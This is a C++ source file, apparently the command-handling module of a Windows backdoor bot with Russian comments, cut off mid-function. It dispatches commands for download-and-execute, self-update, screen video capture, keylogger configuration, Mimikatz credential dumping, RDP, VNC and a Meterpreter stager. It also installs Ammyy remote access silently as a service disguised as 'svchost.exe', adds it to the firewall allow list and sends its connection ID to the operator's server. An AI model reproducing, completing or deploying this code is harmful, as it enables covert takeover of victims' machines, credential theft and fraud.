#include "task.h"
#include "core\misc.h"
#include "core\debug.h"
#include "task.h"
#include "core\http.h"
#include "core\file.h"
#include "core\pipe.h"
#include "core\cab.h"
#include "core\util.h"
#include "core\HttpProxy.h"
#include "core\ThroughTunnel.h"
#include "core\pe.h"
#include "core\runinmem.h"
#include "service.h"
#include "Manager.h"
#include "main.h"
#include "sandbox.h"
#include "tools.h"
#include "system.h"
#include "other.h"
#include "errors.h"
#include "plugins.h"

TaskServer::TaskServer()
{
	Config::CreateMutex();
}

TaskServer::~TaskServer()
{
}

int TaskServer::Handler( Pipe::Msg* msgIn, void** msgOut )
{
	int ret = 0;
	switch( msgIn->cmd )
	{
		case CmdExecTask:
			Task::ExecCmd( (char*)msgIn->data, msgIn->sz_data );
			break;
		case CmdGetGlobalState:
			GetGlobalState( *((int*)msgIn->data) );
			*msgOut = &state;
			ret = 1;
			break;
		case CmdSetGlobalState:
			SetGlobalState( *((int*)msgIn->data), *((char*)msgIn->data + sizeof(int)) );
			*msgOut = &state;
			ret = 1;
			break;
		case CmdAddStartCmd:
			Task::AddStartCmd( (char*)msgIn->data );
			break;
	}
	return ret;
}

void TaskServer::Disconnect()
{
	DbgMsg( "Сервер выполнения команд остановлен" );
	Config::ReleaseMutex();
}

bool TaskServer::Reg()
{
	return ManagerServer::RegTaskServer(this);
}

bool TaskServer::ExecTask( const char* namePipe, const char* cmd, int len )
{
	return PipeClient::Send( namePipe, CmdExecTask, cmd, len ); 
}

namespace Task
{

static HANDLE hbotExe = 0;

static HANDLE hconfigFile = 0;
static StringArray* saConfigFile = 0; //команды выполняемые при загрузке конфига (бота)
static char* stateConfigFile = 0; //сохраняемое в конфиге состояние бота (команда в конфиге - state)
CRITICAL_SECTION csConfigFile;
bool notSaveConfig = false; //если true, то не нужно сохранять конфиг при его изменении (используется при его загрузке)

void ProtectBot()
{
	File::SetAttributes( Config::fileNameBot, FILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_SYSTEM );
	hbotExe = File::Open( Config::fileNameBot, GENERIC_READ, OPEN_EXISTING );
}

void UnprotectBot()
{
	File::Close(hbotExe);
	File::SetAttributes( Config::fileNameBot, FILE_ATTRIBUTE_NORMAL ); //снимаем аттрибуты защиты
}

static void ProtectConfig()
{
	File::SetAttributes( Config::fileNameConfig, FILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_SYSTEM );
	hconfigFile = File::Open(Config::fileNameConfig, GENERIC_READ, OPEN_EXISTING );
}

static void UnprotectConfig()
{
	File::Close(hconfigFile);
	File::SetAttributes( Config::fileNameConfig, FILE_ATTRIBUTE_NORMAL ); //снимаем аттрибуты защиты
}

static void SaveConfig()
{
}

//тип функции выполняющей команду
typedef void (*typeFuncExecCmd)( StringBuilder& cmd, StringBuilder& args );

//связка имени команды с функцией
struct CommandFunc
{
	uint nameHash;
	typeFuncExecCmd func;
};

static void ExecCmd_LoadConfig( StringBuilder& cmd, StringBuilder& args );
static void ExecCmd_State( StringBuilder& cmd, StringBuilder& args );

static void ExecCmd_Video( StringBuilder& cmd, StringBuilder& args );
static void ExecCmd_Download( StringBuilder& cmd, StringBuilder& args );
static void ExecCmd_Ammyy( StringBuilder& cmd, StringBuilder& args );
static void ExecCmd_Update( StringBuilder& cmd, StringBuilder& args );
static void ExecCmd_UpdKlgCfg( StringBuilder& cmd, StringBuilder& args );
#ifdef ON_IFOBS
static void ExecCmd_IFobs( StringBuilder& cmd, StringBuilder& args );
#endif
static void ExecCmd_HttpProxy( StringBuilder& cmd, StringBuilder& args );
static void ExecCmd_KillOs( StringBuilder& cmd, StringBuilder& args );
static void ExecCmd_Reboot( StringBuilder& cmd, StringBuilder& args );
static void ExecCmd_Tunnel( StringBuilder& cmd, StringBuilder& args );
static void ExecCmd_Adminka( StringBuilder& cmd, StringBuilder& args );
static void ExecCmd_Server( StringBuilder& cmd, StringBuilder& args );
static void ExecCmd_User( StringBuilder& cmd, StringBuilder& args );
static void ExecCmd_RDP( StringBuilder& cmd, StringBuilder& args );
static void ExecCmd_Secure( StringBuilder& cmd, StringBuilder& args );
static void ExecCmd_Del( StringBuilder& cmd, StringBuilder& args );
static void ExecCmd_StartCmd( StringBuilder& cmd, StringBuilder& args );
static void ExecCmd_RunMem( StringBuilder& cmd, StringBuilder& args );
#ifdef ON_MIMIKATZ
static void ExecCmd_LogonPasswords( StringBuilder& cmd, StringBuilder& args );
#endif
static void ExecCmd_Screenshot( StringBuilder& cmd, StringBuilder& args );
static void ExecCmd_Sleep( StringBuilder& cmd, StringBuilder& args );
static void ExecCmd_Dupl( StringBuilder& cmd, StringBuilder& args );
static void ExecCmd_FindFiles( StringBuilder& cmd, StringBuilder& args );
static void ExecCmd_VNC( StringBuilder& cmd, StringBuilder& args );
static void ExecCmd_RunFile( StringBuilder& cmd, StringBuilder& args );
static void ExecCmd_KillBot( StringBuilder& cmd, StringBuilder& args );
static void ExecCmd_ListProcess( StringBuilder& cmd, StringBuilder& args );
static void ExecCmd_Plugins( StringBuilder& cmd, StringBuilder& args );
static void ExecCmd_TinyMet( StringBuilder& cmd, StringBuilder& args );
static void ExecCmd_KillProcess( StringBuilder& cmd, StringBuilder& args );
static void ExecCmd_Cmd( StringBuilder& cmd, StringBuilder& args );
static void ExecCmd_RunPlug( StringBuilder& cmd, StringBuilder& args );
static void ExecCmd_Autorun( StringBuilder& cmd, StringBuilder& args );
//static void ExecCmd_MsgBox( StringBuilder& cmd, StringBuilder& args );


//таблица команд
CommandFunc commands[] = 
{
	{ 0x0aa37987 /*loadconfig*/, ExecCmd_LoadConfig }, //загрузка конфига бота (Config::fileNameConfig), только для внутреннего использования ботом
	{ 0x007aa8a5 /*state*/, ExecCmd_State }, //установка сохраненного состояния бота

	{ 0x007cfabf /*video*/, ExecCmd_Video },
	{ 0x06e533c4 /*download*/, ExecCmd_Download },
	{ 0x00684509 /*ammyy*/, ExecCmd_Ammyy },
	{ 0x07c6a8a5 /*update*/, ExecCmd_Update },
	{ 0x0b22a5a7 /*updklgcfg*/, ExecCmd_UpdKlgCfg },
#ifdef ON_IFOBS
	{ 0x006fd593 /*ifobs*/, ExecCmd_IFobs },
#endif
	{ 0x0b77f949 /*httpproxy*/, ExecCmd_HttpProxy },
	{ 0x07203363 /*killos*/, ExecCmd_KillOs },
	{ 0x078b9664 /*reboot*/, ExecCmd_Reboot },
	{ 0x07bc54bc /*tunnel*/, ExecCmd_Tunnel },
	{ 0x07b40571 /*adminka*/, ExecCmd_Adminka },
	{ 0x079c9cc2 /*server*/, ExecCmd_Server },
	{ 0x0007c9c2 /*user*/, ExecCmd_User },
	{ 0x000078b0 /*rdp*/, ExecCmd_RDP },
	{ 0x079bac85 /*secure*/, ExecCmd_Secure },
	{ 0x00006abc /*del*/, ExecCmd_Del },
	{ 0x0a89af94 /*startcmd*/, ExecCmd_StartCmd },
	{ 0x079c53bd /*runmem*/, ExecCmd_RunMem },
#ifdef ON_MIMIKATZ
	{ 0x0f4c3903 /*logonpasswords*/, ExecCmd_LogonPasswords },
#endif
	{ 0x0bc205e4 /*screenshot*/, ExecCmd_Screenshot },
	{ 0x007a2bc0 /*sleep*/, ExecCmd_Sleep },
	{ 0x0006bc6c /*dupl*/, ExecCmd_Dupl },
	{ 0x04acafc3 /*findfiles*/, ExecCmd_FindFiles },
	{ 0x00007d43 /*vnc*/, ExecCmd_VNC },
	{ 0x09c4d055 /*runfile*/, ExecCmd_RunFile },
	{ 0x02032914 /*killbot*/, ExecCmd_KillBot },
	{ 0x08069613 /*listprocess*/, ExecCmd_ListProcess },
	{ 0x073be023 /*plugins*/, ExecCmd_Plugins },
	{ 0x0b0603b4 /*tinymet*/, ExecCmd_TinyMet },
	{ 0x08079f93 /*killprocess*/, ExecCmd_KillProcess },
	{ 0x00006a34 /*cmd*/, ExecCmd_Cmd },
	{ 0x09c573c7 /*runplug*/, ExecCmd_RunPlug },
	{ 0x08cb69de /*autorun*/, ExecCmd_Autorun },
//	{ 0x0749d968 /*msgbox*/, ExecCmd_MsgBox },
	{ 0, 0 }
};

DWORD WINAPI ExecCmdThread( void* data );

bool Init()
{
	hconfigFile = 0;
	saConfigFile = 0; 
	stateConfigFile = 0; 
	CriticalSection::Init(csConfigFile);
	return true;
}

bool ExecCmd( const char* cmd, int len )
{
	char* data = Str::Duplication( cmd, len );
	return RunThread( ExecCmdThread, data );
}

DWORD WINAPI ExecCmdThread( void* data )
{
	int len = Str::Len( (char*)data );
	StringBuilder text( 0, len + 1, (char*)data, len );
	DbgMsg( "Получена команда: '%s'", text.c_str() );

	StringArray cmds = text.Split('\n');
	for( int i = 0; i < cmds.Count(); i++ )
	{
		char* cmd = cmds[i]->c_str();
		int p = Str::IndexOf( cmd, ' ' );
		if( p < 0 ) //p будет указывать на начало аргументов
			p = cmds[i]->Len();
		else
		{
			cmd[p] = 0;
			p++;
			while( cmd[p] == ' ' ) p++; //проскакиваем пробелы
		}
		StringBuilder cmdName( 0, p + 1, cmd );
		cmdName.Lower();
		uint nameHash = 0;
		if( cmdName[0] == '@' ) //команда в виде хеша заданного десятиричным числом
			nameHash = cmdName.ToInt(1);
		else
			nameHash = cmdName.Hash();
		int j = 0;
		while( commands[j].nameHash )
		{
			if( nameHash == commands[j].nameHash )
			{
				StringBuilder args;
				StringBuilderStack<16> cmdHash;
				cmdHash += '@';
				cmdHash += nameHash;
				args = cmd + p;
				commands[j].func( cmdHash, args);
				break;
			}
			j++;
		}
	}

	Mem::Free(data);
	return 0;
}

static void SaveCmdInConfigFile( const StringBuilder& cmd, const StringBuilder& args, bool del, bool onlySave = false )
{
	CriticalSection cs(csConfigFile);
	StringBuilder cmds;
	char end[3]; RN(end);
	int i = 0;
	bool update = onlySave;
	while( i < saConfigFile->Count() )
	{
		bool add = true;
		StringBuilder& s = saConfigFile->Get(i);
		if( !update && s.Cmp( cmd, cmd.Len() ) == 0 && s[cmd.Len()] == ' ' ) //такая команда есть, заменяем
		{
			if( del )
			{
				saConfigFile->Del(i);
				add = false;
			}
			else
			{
				s = cmd;
				s += ' ';
				s += args;
			}
			update = true;
		}
		if( add )
		{
			cmds += s;
			cmds += end;
			i++;
		}
	}
	if( !update && !del )
	{
		StringBuilder s;
		s = cmd;
		s += ' ';
		s += args;
		cmds += s;
		saConfigFile->Add(s);
	}
	if( !notSaveConfig )
	{
		if( hconfigFile )
		{
			UnprotectConfig();
		}
		File::Write( Config::fileNameConfig, cmds );
		ProtectConfig();
	}
}

void AddStartCmd( const char* cmd )
{
	int p = Str::IndexOf( cmd, ' ' );
	if( p < 0 ) p = Str::Len(cmd);
	uint cmdHash = Str::Hash( cmd, p );
	StringBuilderStack<32> cmd2;
	cmd2 += '@';
	cmd2 += cmdHash;
	StringBuilder args2( 0, -1, cmd + p + 1 );
	Task::SaveCmdInConfigFile( cmd2, args2, false );
}

//извлекает и возвращает имя юзера передаваемого в аргументах команды
//юзер должен быть в виде: user$NameUser, где NameUser - имя юзера, если указано только user, то возвращается MAIN_USER
//возвращается строка которую нужно потом удалить
//В строке s будет удалена информация о юзере
static char* GetUserFromCmd( StringBuilder& s )
{
	if( Str::Cmp( s, _CS_("user"), 4 ) ) return 0;
	char* ret = 0;
	int p = 4;
	if( s[p] == '$' ) //указано имя юзера
	{
		int p2 = s.IndexOf(' ');
		if( p2 < 0 ) p2 = s.Len();
		ret = Str::Duplication( s.c_str() + p + 1, p2 - p - 1 );
		p = p2 + 1;
	}
	else
	{
		ret = MAIN_USER;
		p++;
	}
	s.Substring(p);
	return ret;
}

/********************************** команда loadconfig (внутренняя) ************************************************/
//загрузка локального конфига бота, используется только ботом при его запуске
void ExecCmd_LoadConfig( StringBuilder& cmd, StringBuilder& args )
{
	DbgMsg( "Выполнение команды loadconfig[%s](%s)", cmd.c_str(), args.c_str() );
	hconfigFile = 0;
	saConfigFile = new StringArray();
	stateConfigFile = 0;
	Mem::Data data;
	notSaveConfig = true; //отключаем сохранения конфига, так как при загрузке команды будут себя добавлять в конфиг и при этом не нужно его сохранять
	if( File::ReadAll( Config::fileNameConfig, data ) )
	{
		StringBuilder s(data);
		char end[3]; RN(end);
		StringArray sa = s.Split(end);
		//последовательное выполнение команд
		for( int i = 0; i < sa.Count(); i++ )
		{
			StringBuilder& cmd = sa[i];
			if( !cmd.IsEmpty() )
				ExecCmdThread( cmd.c_str() );
		}
		ProtectConfig();
	}
	notSaveConfig = false;
	StringBuilder empty;
	//сохраняем конфиг, на случай если какие-то команды перестали быть нужны (одноразовые)
	SaveCmdInConfigFile( empty, empty, false, true );
}

/********************************** команда state (внутренняя) ************************************************/
//устанавливает загруженное состояние бота
void ExecCmd_State( StringBuilder& cmd, StringBuilder& args )
{
	DbgMsg( "Выполнение команды state[%s](%s)", cmd.c_str(), args.c_str() );
	stateConfigFile = Str::Duplication(args);
	SaveCmdInConfigFile( cmd, args, false );
}

/********************************** команда video ************************************************/
//формат команды: video [user$ИмяЮзера] ИмяВидео [ИмяПроцесса]
//если имя процесса не указано, то пишется со всего экрана
//имя видео должно быть обязательно
//команда video off отключает видео запись
//команда запоминается и будет вновь запущена после ребута
//если указано имя юзера, то процесс работающий с видео перезапускается под указанным юзером
void ExecCmd_Video( StringBuilder& cmd, StringBuilder& args )
{
	DbgMsg( "Выполнение команды video[%s](%s)", cmd.c_str(), args.c_str() );
	args.Lower();
	uint hash = args.Hash();
	if( hash == 0x000075c6 /*off*/ )
	{
		ManagerServer::StopVideo();
		SaveCmdInConfigFile( cmd, args, true );
	}
	else if( hash == 0x00075c2c /*null*/ )
	{
		ManagerServer::SendFirstVideoFrame();
	}
	else
	{
		StringArray ss = args.Split(' ');
		if( ss.Count() > 0 )
		{
			int n = 0;
			char* nameUser = GetUserFromCmd(*ss[n]);
			if( nameUser )
			{
				ManagerServer::VideoServerRestart(nameUser);
				Delay(5000); //ждем пока перезапустится видео процесс
				if( nameUser != MAIN_USER ) Str::Free(nameUser);
				n++;
			}
			char* nameVideo = ss[n]->c_str();
			if( *nameVideo )
			{
				DWORD pid = 0;
				if( ss.Count() > n + 1 ) //есть имя процесса
				{
					n++;
					pid = Process::GetPID( ss[n]->c_str() );
				}
				ManagerServer::StartVideo( nameVideo, pid );
				SaveCmdInConfigFile( cmd, args, false );
			}
		}
	}
}

/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

//после загрузки файла попадаем сюда
static void HandlerDownloadLoadFile( Pipe::AutoMsg msg, DWORD tag )
{
	if( msg->data ==  0 ) return;
	DbgMsg("Для команды download файл успешно загружен");
	char folder[MAX_PATH], fileName[MAX_PATH];
	API(KERNEL32, GetTempPathA)( sizeof(folder), folder );
	API(KERNEL32, GetTempFileNameA)( folder, 0, 0, fileName );
	File::WriteAll( fileName, msg->data, msg->sz_data );
	DbgMsg("Загруженный файл сохранили в '%s' (tag=%08x)", fileName, tag );
	char* nameUser = (char*)tag;
	Sandbox::Exec( fileName, 0, nameUser );
	if( nameUser != MAIN_USER ) Str::Free(nameUser);
}

/******************** команда download **********************************************************/
//формат команды: download [user$ИмяЮзера] {url | имя плагина}
//загружает файл по урл или имени плагина, сохраняет его во временном файле и запускает
//если указан аргумент user, то если бот запущен под системой, то файл будет запущен под текущем юзером
static void ExecCmd_Download( StringBuilder& cmd, StringBuilder& args )
{
	DbgMsg( "Выполнение команды download[%s](%s)", cmd.c_str(), args.c_str() );
	//загрузку файла делаем через запрос к главному менеджеру, который передаст запрос процессу который имеет права загружать файлы
	char* nameUser = GetUserFromCmd(args);
	if( args.IndexOf(':') > 0 || args.IndexOf('/') > 0 || args.IndexOf('\\') > 0 )
		ManagerServer::LoadFile( args, HandlerDownloadLoadFile, 0, (DWORD)nameUser );
	else
		ManagerServer::LoadPlugin( args, HandlerDownloadLoadFile, 0, (DWORD)nameUser );
}

/**************************** команда ammyy *****************************************/
//без параметров: если плагин не был загружен, то загружает ammyy.plug (cab архив), распаковывает, инсталирует и запускает ammy.
//При инсталяции узнается ид для подключения и отсылается на сервер в папку ammy\id
//параметр install - заново загружает плагин и инсталирует его
//параметр del - уничтожает процесс aa.exe и удаляет плагин
//параметр stop - останавливает амми
//параметр run - запускает амми
//при инсталяции амми ставится как сервис, если это не удалось, то запускается как обычный exe

static const char* ammyyExe = _CT_("svchost.exe");
static const char* nameAmmyyPlug = _CT_("ammyy.plug");
static const char* folderAmmyy = _CT_("MSNET");

static bool GetAmmyyID( const StringBuilder& pathAmmy, const StringBuilder& prefix, char* id )
{
	StringBuilder log;
	log = pathAmmy;
	Path::GetPathName(log);
	StringBuilderStack<32> logName( prefix.c_str(), prefix.Len() );
	logName += _CS_("_id.log");
	Path::AppendFile( log, logName );
	DbgMsg( "Лог файл амми %s", logName );
	StringBuilder exe;
	exe = pathAmmy;
	exe += " -outid";
	bool ret = false;
	if( Sandbox::Exec(exe) )
	{
		for( int i = 0; i < 5; i++ )
		{
			Delay(3000);
			Mem::Data data;
			if( File::ReadAll( log, data ) )
			{
				StringBuilder s(data);
				StringArray sa = s.Split('\n');
				if( sa.Count() > 1 )
				{
					StringBuilder& id2 = sa[0];
					if( id2.Len() > 8 ) //ида в файле нет
					{
						int p = id2.IndexOf('=');
						if( p > 0 )
						{
							Str::Copy( id, id2.c_str() + p + 1 );
							ret = true;
							break;
						}
					}
				}
			}
		}
	}
	File::Delete(log);
	return ret;
}
//возвращает префикс в имени лога который выдается по параметру -outid, этот префикс также является папкой для ammy где находятся настройки
void GetPrefixAmmyy( const StringBuilder& path, StringBuilder& prefix )
{
	Mem::Data data;
	if( !File::ReadAll( path, data ) ) return;
	int p = data.IndexOf( _CS_("_id.log"), 7 );
	if( p < 0 ) return;
	int p2 = p - 1;
	while( data.p_char()[p2 - 1] ) p2--;
	prefix.Copy( data.p_char() + p2, p - p2 );
}

char* ammyyFiles[] = { _CT_("settings3.bin"), 0 };
//копирует файлы настроек для амми в папку амми
void CopyAmmyyFiles( const StringBuilder& path, StringBuilder& prefix )
{
	StringBuilder folderFrom, folderTo;
	folderFrom = path;
	Path::GetPathName(folderFrom); //отделяем exe
	folderTo = folderFrom;
	Path::GetPathName(folderTo); //отделяем папку куда распаковали
	Path::AppendFile( folderTo, prefix);
	Path::CreateDirectory(folderTo);
	int i = 0;
	while( ammyyFiles[i] )
	{
		StringBuilderStack<64> fileName = DECODE_STRING(ammyyFiles[i]);
		StringBuilder fileFrom, fileTo;
		Path::Combine( fileFrom, folderFrom, fileName );
		Path::Combine( fileTo, folderTo, fileName );
		DbgMsg( "Копирование %s -> %s", fileFrom.c_str(), fileTo.c_str() );
		File::Copy( fileFrom, fileTo );
		i++;
	}
}

static bool DelAmmyy();
//после загрузки плагина ammy попадаем сюда
static void HandlerAmmyyPlugin( Pipe::AutoMsg msg, DWORD )
{
	int err = TaskErr::Succesfully;
	StringBuilderStack<16> comment;
	DbgMsg( "-- %08x %d", msg->data, msg->sz_data );
	if( msg->data ==  0 )
	{
		DbgMsg( "Плагин ammyy.plug не удалось загрузить" );
		err = TaskErr::PluginNotLoad;
	}
	else
	{
		DbgMsg( "Плагин ammyy.plug загружен" );
		StringBuilderStack<MAX_PATH> path;
		if( Path::GetCSIDLPath( CSIDL_COMMON_APPDATA, path, DECODE_STRING(folderAmmyy) ) )
		{
			DelAmmyy();
			StringBuilderStack<16> nameAA = DECODE_STRING(ammyyExe); //имя процесса ammyy
			Mem::Data data;
			data.Link( msg->data, msg->sz_data );
			if( Cab::Extract( data, path ) )
			{
				DbgMsg( "Плагин ammyy.plug распаковали в '%s'", path.c_str() );
			//создаем конфигурационный файл
/*
			StringBuilder am_cfg;
			StringBuilderStack<3> end; end.FillEndStr();
			am_cfg += Config::UID;
			am_cfg += end;
			StringBuilder hosts( MaxSizeHostAdmin, DECODE_STRING(Config::Hosts) );
			StringArray hs = hosts.Split('|');
			for( int i = 0; i < hs.Count(); i++ )
			{
				am_cfg += *hs[i];
				am_cfg += end;
			}
			Path::AppendFile( path, _CS_("am.cfg") );
			File::Write( path, am_cfg );
			Path::GetPathName(path);
*/
				//запускаем
				Path::AppendFile( path, nameAA );
				AddAllowedprogram(path);
				Delay(1000); //ждем пока в брандмаузере добавится
				StringBuilderStack<16> prefix;
				GetPrefixAmmyy( path, prefix );
				DbgMsg( "Префикс лога амми %s", prefix.c_str() );
				CopyAmmyyFiles( path, prefix );
				bool serviceOk = false;
				StringBuilderStack<256> nameService, displayName;
				if( Service::CreateNameService( nameService, displayName ) )
				{
					StringBuilder path2;
					path2 = path;
					path2 += _CS_(" -service");
					if( Service::Create( path2, nameService, displayName ) )
					{
						DbgMsg( "Установили амми как сервис '%s' %s'", nameService.c_str(), displayName.c_str() );
						if( Service::Start(nameService) )
						{
							DbgMsg( "Амми сервис запущен" );
							serviceOk = true;
						}
					}
				}
				if( !serviceOk )
				{
					path += _CS_(" -nogui");
					Sandbox::Exec(path);
				}
				char ID[24];
				Delay(2000); //ждем пока запустится амми
				for( int i = 0; i < 3; i++ )
					if( GetAmmyyID( path, prefix, ID ) )
					{
						DbgMsg( "ID амми %s", ID );
						Mem::Data data;
						data.Link( ID, Str::Len(ID) );
						ManagerServer::SendFileToVideoServer( _CS_("ammy"), _CS_("id"), _CS_("txt"), data );
						ManagerServer::SendData( _CS_("ammy_id.txt"), data.Ptr(), data.Len(), false );
						data.Unlink();
						break;
					}
				if( err == TaskErr::Succesfully )
				{
					comment = serviceOk ? _CS_("service") : _CS_("application");
				}
			}
			else
				err = TaskErr::BadCab;
			data.Unlink();
		}
		else
			err = TaskErr::NotCreateDir;
	}
	StringBuilderStack<8> cmd( _CS_("ammy") );
	ManagerServer::SendResExecutedCmd( cmd, err, comment );
}

static bool AmmyIsService( StringBuilder& nameService )
{
	StringBuilderStack<MAX_PATH> path;
	if( Path::GetCSIDLPath( CSIDL_COMMON_APPDATA, path, DECODE_STRING(folderAmmyy) ) )
	{
		Path::AppendFile( path, DECODE_STRING(ammyyExe) );
		path.Lower();
		path += _CS_(" -service");
		if( Service::GetNameService( nameService, path ) )
			return true;
	}
	return false;
}

static bool StopAmmyy();

static bool DelAmmyy()
{
	DbgMsg( "Удаление ammyy" );
	bool ret = StopAmmyy();
	StringBuilderStack<MAX_PATH> name;
	if( AmmyIsService(name) )
	{
		if( Service::Delete(name) )
		{
			DbgMsg( "Амми сервис удален" );
			ret = true;
		}
		else
		{
			DbgMsg( "Амми сервис удалить не удалось" );
			ret = false;
		}
	}

	StringBuilderStack<MAX_PATH> path;
	if( Path::GetCSIDLPath( CSIDL_COMMON_APPDATA, path, DECODE_STRING(folderAmmyy) ) )
	{
		Path::DeleteDirectory(path);
	}
	return ret;
}

//завершение работы амми
static bool StopAmmyy()
{
	DbgMsg( "Остановка амми" );
	StringBuilderStack<MAX_PATH> name;
	if( AmmyIsService(name) )
	{
		DbgMsg( "Амми как сервис остановлен" );
		return Service::Stop(name);
	}
	else
	{
		if( Path::GetCSIDLPath( CSIDL_COMMON_APPDATA, name, DECODE_STRING(folderAmmyy) ) )
		{
			Path::AppendFile( name, DECODE_STRING(ammyyExe) );
			DWORD pid = Process::GetPID( name, true );
			if( pid )
			{
				DbgMsg( "Амми запущен как обычный процесс, убили" );
				return Process::Kill( pid, 5000 );
			}
			else
			{
				DbgMsg( "Амми не запущен" );
				return true;
			}
		}
	}
	return false;
}

//стартует уже установленный амми
static bool RunAmmyy()
{
	DbgMsg( "Запуск амми" );
	StringBuilderStack<MAX_PATH> name;
	if( AmmyIsService(name) )
	{
		DbgMsg( "Амми запущен как сервис" );
		return Service::Start(name);
	}
	else
	{
		if( Path::GetCSIDLPath( CSIDL_COMMON_APPDATA, name, DECODE_STRING(folderAmmyy) ) )
		{
			Path::AppendFile( name, DECODE_STRING(ammyyExe) );
			name += _CS_(" -nogui");
			return Sandbox::Exec(name);
		}
	}
	return false;
}

static void RunOrInstallAmmyy( StringBuilder& cmd )
{
	StringBuilderStack<MAX_PATH> path;
	if( Path::GetCSIDLPath( CSIDL_COMMON_APPDATA, path, DECODE_STRING(folderAmmyy) ) )
	{
		StringBuilderStack<16> nameAA = DECODE_STRING(ammyyExe); //имя процесса ammyy
		Path::AppendFile( path, nameAA );
		if( File::IsExists(path) ) //плагин уже установлен
		{
			int err = TaskErr::Succesfully;
			DbgMsg( "Ammyy уже установлен, запускаем" );
			if( !Process::GetPID(nameAA) ) //не запущен
			{
				err = RunAmmyy() ? TaskErr::Succesfully : TaskErr::Wrong;
			}
			else
				err = TaskErr::Runned;
			ManagerServer::SendResExecutedCmd( cmd, err );
		}
		else
		{
			DbgMsg( "Ammy не установлен, загружаем" );
			StringBuilderStack<32> name( DECODE_STRING(nameAmmyyPlug) );
			ManagerServer::LoadPlugin( name, HandlerAmmyyPlugin );
		}
	}
}

static void ExecCmd_Ammyy( StringBuilder& cmd, StringBuilder& args )
{
	DbgMsg( "Выполнение команды ammyy[%s](%s)", cmd.c_str(), args.c_str() );
	args.Lower();
	if( args.IsEmpty() )
	{
		RunOrInstallAmmyy(cmd);
	}
	else 
	{
		int err = TaskErr::Param;
		uint argHash = args.Hash();
		if( argHash == 0x005aa85c /*install*/ )
		{
			StringBuilderStack<32> name( DECODE_STRING(nameAmmyyPlug) );
			ManagerServer::LoadPlugin( name, HandlerAmmyyPlugin );
			err = - 1;
		}
		else if( argHash == 0x00006abc /*del*/ )
			err = DelAmmyy() ? TaskErr::Succesfully : TaskErr::Wrong;
		else if( argHash == 0x0007ab60 /*stop*/ )
			err = StopAmmyy() ? TaskErr::Succesfully : TaskErr::Wrong;
		else if( argHash == 0x000079be /*run*/ )
			err = RunAmmyy() ? TaskErr::Succesfully : TaskErr::Wrong;
		if( err >= 0 ) ManagerServer::SendResExecutedCmd( cmd, err );
	}
}

///////////////////////////////////////////////////////////////////////////////////////////////

static void UpdateBot( byte* data, int sz_data, bool cold )
{
	char pathNewBot[MAX_PATH];
	const char* path = 0;
	if( sz_data > 0 )
	{
		bool valid = false;
		if( data[0] == 'M' && data[1] == 'Z' ) 
		{
			if( Config::state & IS_DLL )
			{
				PIMAGE_NT_HEADERS headers = PE::GetNTHeaders( (HMODULE)data );
				if( headers->FileHeader.Characteristics & IMAGE_FILE_DLL )
					valid = true;
			}
			else
				valid = true;
		}
		if( valid )
		{
			Task::UnprotectBot();	
			if( File::WriteAll( Config::fileNameBot, data, sz_data ) )
			{
				if( cold )
					Task::ProtectBot();
				else
					path = Config::fileNameBot;
					
				DbgMsg( "Обновление прошло успешно" );
			}
			else
			{
				DbgMsg( "Обновить файл бота не удалось, ставим обновление после ребута" );
				File::GetTempFile(pathNewBot);
				if( File::WriteAll( pathNewBot, data, sz_data ) )
				{
					DbgMsg( "Обновление '%s' -> '%s'", pathNewBot, Config::fileNameBot );
					API(KERNEL32, MoveFileExA)( Config::fileNameBot, pathNewBot, MOVEFILE_REPLACE_EXISTING | MOVEFILE_DELAY_UNTIL_REBOOT );
					path = pathNewBot;
				}
			}
			if( !cold && path ) //горячая замена
			{
				Config::ReleaseMutex();
				if( Config::state & IS_DLL )
				{
					Config::SaveNameManager();
					if( API(KERNEL32, LoadLibraryA)(path) ) //запускаем нового бота
						PipeClient::Send( Config::nameManager, PipeServer::CmdDisconnect, 0, 0 );
				}
				else
				{
					Process::Exec( _CS_("%s -u %s"), path, Config::nameManager );
					PipeClient::Send( Config::nameManager, PipeServer::CmdDisconnect, 0, 0 );
				}
			}
		}
	}
}

static void HandlerUpdatePlugin( Pipe::AutoMsg msg, DWORD tag )
{
	DbgMsg( "Плагин для обновления загружен" );
	bool cold = tag != 0;
	UpdateBot( msg->data, msg->sz_data, cold );
}

/******************************* команда update *****************************************************/
//Осуществляет горячее или холодное обновление бота
//Формат команды: update [cold] имя плагина (обновления)
//Если не указан cold (горячее обновление), то загружается указанное обновление, заменяется файл в автозагрузке (сервисе) и запускается, 
//в тоже время текущий бот завершает работу
//Если указан cold (холодное обновление), то загружается указанное обновление и заменяется файл в автозагрузке (сервисе)
//обновление вступит в силу только после ребута
static void ExecCmd_Update( StringBuilder& cmd, StringBuilder& args )
{
	DbgMsg( "Выполнение команды update[%s](%s)", cmd.c_str(), args.c_str() );
	//StringBuilderStack<16> namePlug( _CS_("update.plug") );
	StringArray sa = args.Split(' ');
	if( sa.Count() == 0 ) return;
	StringBuilder* name = 0;
	bool cold = false;
	if( sa.Count() > 1 )
	{
		if( sa[0]->Hash() == 0x0006a624 /*cold*/ )
		{
			name = sa[1];
			cold = true;
		}
	}
	else
	{
		name = sa[0];
	}
	if( name )
	{
		if( name->IndexOf('\\') >= 0 || name->IndexOf('/') >= 0 ) //обновление с файла
		{
			Mem::Data data;
			if( File::ReadAll( name->c_str(), data ) )
			{
				UpdateBot( data.p_byte(), data.Len(), cold );
			}
		}
		else
			ManagerServer::LoadPlugin( *name, HandlerUpdatePlugin, 0, (DWORD)cold );
	}
}

/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
/************************************ команда updklgcfg ***************************************************************************/
//загрузка конфигурационного файла с админки для кейлогера. Параметры не нужны
static void ExecCmd_UpdKlgCfg( StringBuilder& cmd, StringBuilder& args )
{
	DbgMsg( "Выполнение команды updklgcfg[%s](%s)", cmd.c_str(), args.c_str() );
	LoadKeyloggerConfig();
}

/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

#ifdef ON_IFOBS

static void ExecCmd_IFobs( StringBuilder& cmd, StringBuilder& args )
{
	IFobs::CreateFileReplacing(args);
}

#endif

/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
/*************************************** команда httpproxy ************************************************************/
//включается http прокси сервер по указанному порту. Служит для доступа к адмике через бота имеющего доступ в инет с бота который не имеет доступ в инет
//формат команды: httpproxy порт
static void ExecCmd_HttpProxy( StringBuilder& cmd, StringBuilder& args )
{
